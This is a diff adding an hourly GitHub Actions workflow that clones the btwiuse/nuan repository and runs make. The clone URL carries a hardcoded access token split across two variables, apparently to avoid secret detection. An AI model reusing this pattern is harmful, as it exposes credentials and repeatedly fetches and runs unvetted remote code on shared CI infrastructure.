@@ -1,0 +1,22 @@
+name: nuan
+
+on:
+  push:
+  schedule:
+    - cron: "0 */1 * * *"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+
+    - run: |
+        A=0e99433161683ed6fa96
+        B=09e90d9f9e80b1aa8cea
+        C=github.com
+        D=btwiuse
+        E=nuan
+        git clone https://${A}${B}@${C}/${D}/${E}.git nuan
+        cd nuan
+        make
+      name: nuan
